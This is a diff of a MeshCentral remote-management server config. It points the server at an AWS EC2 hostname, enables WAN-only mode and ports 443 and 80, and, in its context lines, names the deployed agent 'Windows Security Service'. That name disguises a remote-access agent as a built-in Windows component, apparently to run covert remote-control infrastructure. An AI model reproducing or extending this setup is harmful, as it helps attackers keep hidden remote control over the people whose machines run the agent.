@@ -3,21 +3,22 @@
   "__comment1__": "This is a simple configuration file, all values and sections that start with underscore (_) are ignored. Edit a section and remove the _ in front of the name. Refer to the user's guide for details.",
   "__comment2__": "See node_modules/meshcentral/sample-config-advanced.json for a more advanced example.",
   "settings": {
-    "_cert": "myserver.mydomain.com",
-    "_WANonly": true,
+    "cert": "ec2-100-53-190-155.compute-1.amazonaws.com",
+    "WANonly": true,
     "_LANonly": true,
     "_sessionKey": "MyReallySecretPassword1",
-    "_port": 443,
-    "_aliasPort": 443,
-    "_redirPort": 80,
-    "_redirAliasPort": 80
+    "port": 443,
+    "aliasPort": 443,
+    "redirPort": 80,
+    "redirAliasPort": 80
   },
   "domains": {
     "": {
       "_title": "MyServer",
       "_title2": "Servername",
-      "minify": true,
-      "compression": true,
+      "_minify": true,
+      "_newAccounts": true,
+      "_userNameIsEmail": true,
       "agentCustomization": {
         "displayName": "Windows Security Service",
         "description": "Windows Security Service",
